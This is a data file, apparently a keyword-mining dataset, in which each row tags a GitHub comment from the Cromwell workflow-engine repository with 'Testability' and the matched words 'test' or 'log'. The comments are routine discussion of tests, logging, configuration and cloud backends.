weekend!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-414000388:234,test,test,234,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-414000388,6,"['log', 'test']","['logic', 'logs', 'test', 'testing', 'tests']"
Testability,"> Love having these tests working!. Give yourself a pat on the back, your walkthrough of where the CI creds are directly inspired it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7204#issuecomment-1682857944:20,test,tests,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7204#issuecomment-1682857944,1,['test'],['tests']
Testability,> Might be tricky to stage but it'd be really nice to see tests for:; > ; > * A file whose crc32c has changed since we created the manifest; > * A file which isn't on the image even though the manifest lists it. These tests may be not required if we use versioned images. Added this topic to today's techtalk agenda.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5746#issuecomment-678291321:58,test,tests,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5746#issuecomment-678291321,2,['test'],['tests']
Testability,"> OK thanks. So it sounds like this test is doing exactly what it was meant to do, but we have some work to do in making Cromwell resilient to this scenario. Actually, that work has already been done and merged into develop. The goal of this ticket was to verify that 1.000.000 rows chosen as default limit is a sane choice.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-638333679:36,test,test,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-638333679,1,['test'],['test']
Testability,"> Ok @Horneth , thank you for the explanation. With call-caching enabled is not so problematic starting the workflow again. Dear @lmtani , would you please give example how to use call-caching in GATK pipeline?. Here is my code:; gcloud \; alpha genomics pipelines run \; --pipeline-file /open_wdl/runners/cromwell_on_google/wdl_runner/wdl_pipeline.yaml \; --inputs-from-file WDL=DNAseqPairedEndSingleSample_Fastq.wdl,\; WORKFLOW_INPUTS=sample1_gpd.inputs.json,\; WORKFLOW_OPTIONS=dna_variant_calling.options.json \; --env-vars WORKSPACE=gs://timdata/exomevcf/workspace,\; OUTPUTS=gs://timdata/exomevcf/result/sample1 \; --logging gs://timdata/exomevcf/logging/sample1.log --memory 5",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-450226579:623,log,logging,623,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-450226579,3,['log'],"['log', 'logging']"
Testability,"> Quick question: We have some logic in other test cases that if only documentation has changed, the sbt and centaur tests are skipped. Will that also apply to this test suite? Although... since this test only took ~6 minutes instead of ~2 hours for some centaur suites, it probably isn't super important!. @cjllanwarne currently it doesn't apply to this suite. It's possible to do so, but I think given that this test is quite short it's not worth overcomplicating our main `test.sh` with additional conditions.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5597#issuecomment-665786875:31,log,logic,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5597#issuecomment-665786875,7,"['log', 'test']","['logic', 'test', 'tests']"
Testability,> Should I merge 2682c00 with this if the CI tests pass?. Yes plz.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-504555440:45,test,tests,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-504555440,1,['test'],['tests']
Testability,"> TOL2: is it worth another ad-hoc hash/UUID here to connect the ""sending"" and ""result"" messages?. But there is hash in there:; `logger.info(s""Failed to execute GCS Batch request $batchCommandsHash"", failure)`. Or do you mean something else?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900:129,log,logger,129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900,1,['log'],['logger']
Testability,"> TOL: To me this feels like it’d be way neater if the EGIN had a field or def called inputFileName nameInInputSet, to encapsulate all this into the egin itself rather than having to add it later externally?. Good point, I was just reticent to the idea of jamming yet another attribute injected by the language that will only ever be used once during the lifetime of the workflow but I agree it's still neater. > FWIW in my ideal world we’d have pluggable languages which should only need to define one function like “readWorkflowIntoWom(content: String, l: Set[ImportResolver]): WomExecutable” and everything else would be included/encapsulated in that result. Yes but there would be some non-DRYness by having each language implement entirely how they ingest inputs (most of the logic is the same), plus having it in WOM guarantees that all EGIN are handled the same way w.r.t coercion, validation etc.. It could use some refactoring though I agree",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2988#issuecomment-349344402:781,log,logic,781,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2988#issuecomment-349344402,1,['log'],['logic']
Testability,"> TOL: should CWL or WDL 2.0 Directory type values support buckets-as-""directory""s?. Good point, and I have no idea. Do we have any known or existing test cases (I'll see in a bit when the conformance tests run). I'm happy to:; - Allow bucket only `GcsPath`, instead only catch the error just before GCS API requests, _or_; - Leave it for now and relax it later as we get tests cases, with a comment pointing to this conversation",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719607732:150,test,test,150,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719607732,3,['test'],"['test', 'tests']"
Testability,"> That issue is already fixed in docker-py 6.1.0. Thanks for pointing this out. It looks like `docker-py` is no longer being updated in PyPl/pip, but `docker` is. `pip` was installing an outdated version because of that. I updated our test to use `docker` instead. This update involved an API change, which I also updated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7131#issuecomment-1536658333:235,test,test,235,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7131#issuecomment-1536658333,1,['test'],['test']
Testability,"> That kind of confusion is exactly why WDL 1.0 (you're currently writing in draft-2) is adding input sections. Ie:. Wow! That is some great functionality.I love how WDL is continuously identifying real problems, and finding solutions for them in a readable, logical and easily to understand syntax. :+1:. Will this inputs section solve this bug? Presumably it will make it at least easier to solve it for the Cromwell developers?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3528#issuecomment-386522096:259,log,logical,259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3528#issuecomment-386522096,1,['log'],['logical']
Testability,"> The `singleWorkflowRunner` and `dockerDeadlock` sub-builds both failed on the last PR run. I was seeing weird errors with `dockerDeadlock` on my builds yesterday that I eventually got past by restarting the builds, but the `singleWorkflowRunner` errors look more suspicious to me. The problem was caused by the fact that singleWorkflowRunner tests rely on application's log messages for validation and the first fix attempt broke logging: `CromwellEntryPoint.buildCromwellSystem` was calling `initLogging` method to tamper with system properties before logback initialization. Then I moved `validateRunArguments` call to happen before the `buildCromwellSubsystem`, but turned out that `validateRunArguments` triggered logback initialization before system properties have been modified, thus making logback misconfigured.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5236#issuecomment-544104556:344,test,tests,344,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5236#issuecomment-544104556,6,"['log', 'test']","['log', 'logback', 'logging', 'tests']"
Testability,"> The docs are correct, the local docker backend does not recognize CPU and memory attributes, because it's impossible to implement with the Docker Desktop API. And even if it was, it would probably not ship because the local backend is intended as a down-featured sandbox environment. @aednichols Are you talking specifically about macOS? You can limit `cpu` and `memory` by running docker on linux though.; I've gotten `cpu` (cores actually) limit working with the following code in the conf file:; ```; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; Int cpu = 1; """""". # Submit string when there is no ""docker"" runtime attribute.; submit = ""/usr/bin/env bash ${script}"". # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; docker run \; --rm -i \; ${""--user "" + docker_user} \; ${""--cpus="" + cpu} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd} \; ${docker} ${docker_script}; """"""; ```. A task that needs more cpu cores would simply request it with the runtime block:; ```; runtime {; docker: ""...""; cpu: 3; }; ```. I've gotten the idea from @ruchim post. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-1303286500:265,sandbox,sandbox,265,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-1303286500,2,['sandbox'],['sandbox']
Testability,"> The messages are logging the size of the list being (re-)added to the BatchRequest, not what's inside the possibly stale ArrayList inside the BatchRequest object. Yeah okay maybe don't mention that then since it will force those future maintainers to imagine what was happening before this variable became a local...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800620139:19,log,logging,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800620139,1,['log'],['logging']
Testability,"> There is one I'm having trouble googling a fix for. I can't figure out how to shut off PostgreSQL exceptions printing possibly sensitive row contents via their messages. I wouldn't be surprised if this is baked into the JDBC layer. We could try something like this:; ```; diff --git a/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala b/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala; index 5d28cf1..5b0e227 100644; --- a/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala; +++ b/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala; @@ -11,6 +11,7 @@ import net.ceedubs.ficus.Ficus._; import org.slf4j.LoggerFactory; import slick.basic.DatabaseConfig; import slick.jdbc.{JdbcCapabilities, JdbcProfile, TransactionIsolation}; +import org.postgresql.util.{PSQLException, ServerErrorMessage}. import scala.concurrent.duration._; import scala.concurrent.{Await, ExecutionContext, Future}; @@ -199,6 +200,8 @@ abstract class SlickDatabase(override val originalDatabaseConfig: Config) extend; case _ => /* keep going */; }; throw rollbackException; + case pe: PSQLException =>; + throw new PSQLException(new ServerErrorMessage(s""Oh no, a postgres error occurred! ${pe.getMessage}"")); }; }(actionExecutionContext); }; ```; only with some on-the-fly modification of the error message instead of my dummy string. This compiles for me, but I'm not sure how to test it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-504487606:692,Log,LoggerFactory,692,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-504487606,2,"['Log', 'test']","['LoggerFactory', 'test']"
Testability,"> There's actually a Centaur tests which verifies that the whole VPC-thing works, so I guess that might be enough. Yes that would be fine. I thought we considered Centaur coverage in our Codecov analysis though...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5894#issuecomment-700239566:29,test,tests,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5894#issuecomment-700239566,1,['test'],['tests']
Testability,"> This can happen if the job fails meaning that an rc.txt file isn’t created. It would be worth looking at the CloudWatch log for the batch job.; > […](#); > On Tue, Jul 21, 2020 at 4:07 PM Sri Paladugu ***@***.***> wrote: Is there any progress on this issue? I am the getting the following exception: IOException: Could not read from s3:///results/ReadFile/5fec5c4a-2e3f-49ed-8f9e-6d9d2d759449/call-read_file/read_file-rc.txt Caused by: java.nio.file.NoSuchFileException: s3:// s3.amazonaws.com/s3bucketname/results/ReadFile/5fec5c4a-2e3f-49ed-8f9e-6d9d2d759449/call-read_file/read_file-rc.txt — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <[#4687 (comment)](https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-662079379)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMJZ66Z5PIAEUX3IBLR4XYPZANCNFSM4G23FFUQ> . Cloudwatch logs contained the following message: ""/bin/bash: /var/scratch/fetch_and_run.sh: Is a directory""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-662170952:122,log,log,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-662170952,2,['log'],"['log', 'logs']"
Testability,"> This change looks safe to me but before merging:; > ; > * As the owners of this code has someone from the BT team(?) cloned this and run it through whatever test(s) are in Travis and/or Jenkins?; Are there some special tests needs to be run for this? If so, no. The tests that were run with the build(travis) passed.; > * Mainly out of curiosity: any idea if the whole AWS backend stopped working where/when/what broke? For example: did the recent dependency upgrades in 68 break something the existing test(s) didn't catch? There wasn't much background in the ticket as to why this fix was suddenly needed, so again just curious.; On EFS backend, the script for each cromwell task gave permission denied error before this fix. It's nothing to do with 68 dependency upgrade. This is caused by changes made for CROM-6682. It affects only the AWS-EFS backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094:159,test,test,159,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094,4,['test'],"['test', 'tests']"
Testability,"> This fixes the problem at the point of expression evaluation... it seems like it might be easier (and a lot less fiddly?) to do the relative file resolution much earlier, at the point that inputs are being read in to the workflow in the first place. > The ValidatedWomNamespace produced as part of workflow materialization contains a womValueInputs field... I wonder whether performing this mapping as part of creating that validated set of inputs would work?. Great suggestion. I will take a look at this. I can checkout the test case on a new branch and try to hack there. One of the catches will be that this resolving will be backend dependent. In the current situation the input expressions are evaluated first, and after that the inputs are resolved. (This makes sense because input can also be something like `baseDir + ""/my_file.txt""`, which needs to be evaluated). But indeed this could be bypassed by doing this already at the workflow level, before it gets passed down to the task level. I will take a look at this. If it does not work, (or work easily) then I will report back here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618838024:528,test,test,528,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618838024,1,['test'],['test']
Testability,"> This is related to CI Updates PR #4169?. Yes. Cromwell's various libraries and executables are only pushed on develop & hotfix branches, well after one has merged changes in a PR. A number of times PR have been unknowingly breaking the develop/hotfix builds. After I confirmed that #4169 helped develop's ""sbt"" build go green, I submitted this #4181 PR to repair the `34_hotfix` branch. #4180 is a similar PR for `35_hotfix`. Meanwhile, #4179 is a couple of regression tests targeted at future `develop` PRs. During any `push` the ""sbt"" build will ensure that credentials for artifactory exist on disk, and that a docker hub repository exists for to-be-pushed executables.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4181#issuecomment-425737133:471,test,tests,471,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4181#issuecomment-425737133,1,['test'],['tests']
Testability,"> This is unusual, I have successfully call cached files of 1 TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:68,test,testing,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['test'],['testing']
Testability,"> This seems too simple to be correct. My usual response when I start thinking like this is ""do I have any lingering doubts that can be documented?"" And if so - ""can I add any tests for to make myself feel more confident?""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4285#issuecomment-431869212:176,test,tests,176,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4285#issuecomment-431869212,2,['test'],['tests']
Testability,"> We add the [workflow ID as a label.](https://github.com/broadinstitute/cromwell/blob/b29d8005e33aadd4e9e57178101bc3ef9d0ca9bc/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/api/GcpBatchRequestFactoryImpl.scala#L139) Are task and shared generated by Cromwell and would they be available from the parameters or somewhere else?. Interesting, I'm running a local build from current `develop` and I seem to have the code you've linked above, but I don't see either the `""cromwell-workflow-id""` or `""goog-batch-worker""` labels on my task logs 🤔. . In `.labels` I have `hostname`, `job_uid`, `task_group_name`, and `task_id` keys.; In `.resource.labels` I have `job_id`, `location`, and `resource_container` keys. For the proposed additional labels, with respect to `GcpBatchRequestFactoryImpl#createAllocationPolicy`:. - Root workflow id is in `data.createParameters.jobDescriptor.workflowDescriptor.rootWorkflowId`.; - Everything else is in the `BackendJobDescriptorKey` via `data.createParameters.jobDescriptor.key`:; - task name in `call.identifier.localName` (I think); - shard in `index`; - attempt in `attempt`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287108046:563,log,logs,563,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2287108046,1,['log'],['logs']
Testability,"> We don't actively test the cluster backend retries, which I think adequately explains why the codecov for this diff is 0. > In other words, the tests don't cover this code because we never use it, but if it works for you then +1 from me. Thanks a lot @cjllanwarne ! I have thought about setting up tests in the cromwell test suite, but it is not very easy (if it all possible) to do this in an automated fashion.; We regularly test our workflows on the cluster, so any issues with Cromwell are bound to come up quickly. ; Thanks again for reviewing and merging!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5003#issuecomment-499366084:20,test,test,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5003#issuecomment-499366084,5,['test'],"['test', 'tests']"
Testability,"> What actually gets printed here, do we see a useful error from the underlying HTTP request? (I've made this mistake before...). So we're wrapping the response with a layer of IO, so this was what I was able to come up with to ensure the response information was piped to the log, but let me know if you think there is a better way. I verified locally with the ubuntu example that we get the 404 not found status, as well as the more informational MANIFEST_UNKNOWN body, so I hope thats enough to capture what we're seeing with Quay",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7135#issuecomment-1550048978:277,log,log,277,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7135#issuecomment-1550048978,1,['log'],['log']
Testability,"> What's weird is that long_cmd fails consistently for me. Are you using the CI config files, or your own config file? `long_cmd` generates an _extremely_ long command line that approximates one of the longer gatk best practice commands. However the test line is so long that an [optional abbreviation](https://github.com/broadinstitute/cromwell/blob/develop/src/ci/resources/build_application.inc.conf#L23) setting was added and enabled-in-CI so that the test could run. With [a bit of setup](https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472915580) one can run `src/ci/bin/testCentaurAws.sh` and it will attempt to use the CI configs locally.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4747#issuecomment-473123093:250,test,test,250,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4747#issuecomment-473123093,3,['test'],"['test', 'testCentaurAws']"
Testability,"> When run the server modle; > ; > ```; > root@NanoTNGS-DEV:~# java -jar /root/cromwell/cromwell-62.jar submit -t wdl hello.wdl -h http://localhost:8000; > [2021-05-14 14:28:43,33] [info] Slf4jLogger started; > [2021-05-14 14:28:44,23] [info] Workflow 51376acd-e9c5-485a-856f-6aa501f25808 submitted to http://localhost:8000; > [ERROR] [05/14/2021 14:28:44.259] [SubmitSystem-akka.actor.default-dispatcher-16] [akka://SubmitSystem/system/pool-master] connection pool for Pool(shared->http://localhost:8000) has shut down unexpectedly; > java.lang.IllegalStateException: Pool shutdown unexpectedly; > 	at akka.http.impl.engine.client.PoolInterface$Logic.postStop(PoolInterface.scala:214); > 	at akka.stream.impl.fusing.GraphInterpreter.finalizeStage(GraphInterpreter.scala:579); > 	at akka.stream.impl.fusing.GraphInterpreter.finish(GraphInterpreter.scala:310); > 	at akka.stream.impl.fusing.GraphInterpreterShell.tryAbort(ActorGraphInterpreter.scala:644); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1(ActorGraphInterpreter.scala:780); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.$anonfun$postStop$1$adapted(ActorGraphInterpreter.scala:780); > 	at scala.collection.immutable.Set$Set2.foreach(Set.scala:181); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.postStop(ActorGraphInterpreter.scala:780); > 	at akka.actor.Actor.aroundPostStop(Actor.scala:558); > 	at akka.actor.Actor.aroundPostStop$(Actor.scala:558); > 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundPostStop(ActorGraphInterpreter.scala:671); > 	at akka.actor.dungeon.FaultHandling.finishTerminate(FaultHandling.scala:215); > 	at akka.actor.dungeon.FaultHandling.terminate(FaultHandling.scala:173); > 	at akka.actor.dungeon.FaultHandling.terminate$(FaultHandling.scala:143); > 	at akka.actor.ActorCell.terminate(ActorCell.scala:447); > 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:555); > 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:571); > 	at akka.dispatch.Mailbox.processAl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053:646,Log,Logic,646,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352#issuecomment-1264217053,1,['Log'],['Logic']
Testability,"> Why do we need them for the duration of the workflow ?. Just getting to this now and I don't 100% remember why. I would try deleting them and ""see what happens"". From what I remember at least one conformance test crashed due to missing files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3186#issuecomment-383250045:210,test,test,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3186#issuecomment-383250045,1,['test'],['test']
Testability,"> Would it be easy to set it for all text outputs? The other one I'm thinking about is monitoring.log. It's pretty much a per-file thing, so each file needs to be considered on its own. gsutil has some logic to infer file type from extension so a `.txt` file should have the correct content type already. It does look like the monitoring file isn't text/plain and it would be easy to add. @mcovarr what do you think?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5103#issuecomment-518329395:98,log,log,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5103#issuecomment-518329395,2,['log'],"['log', 'logic']"
Testability,"> got an example of a fork in the liquibase scripts?. > One workaround that I'm already using in a couple of places is having a separate changeSet specific to postgres. See this link: http://www.liquibase.org/2009/03/what-effects-changeset-checksums.html. Those ""couple of places"" are likely the ""forks"" @geoffjentry was referring to. Additional changesets are fine, but ""adjusting the database migrations"" will add additional setup and test criteria regarding the MD5s. Here are two examples:. https://github.com/broadinstitute/cromwell/blob/70cff69799f149191bdaec5d8878dd2a3d5202b7/database/migration/src/main/resources/changesets/sync_not_null_constraints.xml#L20-L36. https://github.com/broadinstitute/cromwell/blob/70cff69799f149191bdaec5d8878dd2a3d5202b7/database/migration/src/main/resources/changesets/lengthen_wdl_value.xml#L5-L15. At minimum for the former changelog I suspect that fixes for Postgres (and [MariaDB](https://github.com/broadinstitute/cromwell/issues/4618) 🤔) will probably change the MD5s. As the link at the top says, there are workarounds to update/ignore the MD5s. But those workarounds will need to be implemented and CI tested-- along w/ [Postgres support](https://docs.travis-ci.com/user/database-setup/#postgresql).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-475014616:437,test,test,437,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-475014616,2,['test'],"['test', 'tested']"
Testability,"> it sounded like it isn't a huge deal, just that there's some nuance to it. - Currently the mechanism for ""checking if a job is done""-- in tests and main code-- is to look for `rc` files; - On restart if the `rc` file is missing, there's a single extra check to the scheduler to see if the job is alive, by running a external command line process per job; - Thousands of jobs should NOT ping a scheduler for GridEngine/SLURM/LSF/etc. or it will be overloaded<sup>1</sup>; - It's ok to hit the filesystem [every second](https://github.com/broadinstitute/cromwell/blob/d9be2ce0993c21c209c8596f55d1295bc93d1974/supportedBackends/sfs/src/main/scala/cromwell/backend/sfs/SharedFileSystemAsyncJobExecutionActor.scala#L55) for thousands of jobs; - The current `SharedFileSystemJobExecutionActorSpec` looks for `rc` files [for up to ten seconds](https://github.com/broadinstitute/cromwell/blob/d9be2ce0993c21c209c8596f55d1295bc93d1974/backend/src/test/scala/cromwell/backend/BackendSpec.scala#L18-L20). All this can be likely be reconciled by having the tests behave differently from the main code. Ideally, the pseduo-backend running tests should quickly test if the job is done. The ""main"" code could look for the `rc` files every 30s or so, and every once in a while ping the GridEngine/SLURM/LSF/etc. master to check if the job is still alive. ---. <sup>1</sup> It would also be possible to cut down on overloading the scheduler masters by batching requests, as we now do with JES/PAPI.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328880929:140,test,tests,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328880929,5,['test'],"['test', 'tests']"
Testability,> it's expected that the Centaur PAPI tests would require /bin/bash while the PAPI conformance tests should be able to get by with /bin/sh. @mcovarr Oh I didn't realize that. I'd be curious to know why. Maybe we can tech talk this tomorrow too,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3697#issuecomment-392637741:38,test,tests,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3697#issuecomment-392637741,2,['test'],['tests']
Testability,"> it's mostly a mystery what the summarizer is up to. 🤔 If we didn't want to log updates, maybe yet-another graphite metric to see summarization throughput?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4757#issuecomment-475105132:77,log,log,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4757#issuecomment-475105132,1,['log'],['log']
Testability,"> looks good to me. why the do not merge label?. Because I haven't tested it yet with PAPI v2, and am not sure how to do so. But if a cromwell expert is confident it looks good, that's OK with me.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-460261256:67,test,tested,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-460261256,1,['test'],['tested']
Testability,> scalafmt. Fixed that by removing the test case. Now unit tests passed but the codecov failed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887927577:39,test,test,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7355#issuecomment-1887927577,2,['test'],"['test', 'tests']"
Testability,"> set it to ""PATH"" to save the logs into the the mounted disk, at the end, this log file gets copied to the google cloud storage bucket with ""task.log"" as the name. Do the task logs really only get copied to the storage bucket **after** the job completes? Cloud Life Sciences asynchronously copies task logs to GCS periodically **while the job is running**. This is the main utility of the task logs in that they allow users to see how jobs are progressing before they terminate.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286243613:31,log,logs,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286243613,6,['log'],"['log', 'logs']"
Testability,> thoughts on how to test HTTP relative imports in centaur. No need to use fakes. Use an http link to a public object in GCS. Ex: https://storage.googleapis.com/gcp-public-data-landsat/index.csv.gz,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3916#issuecomment-406769307:21,test,test,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3916#issuecomment-406769307,1,['test'],['test']
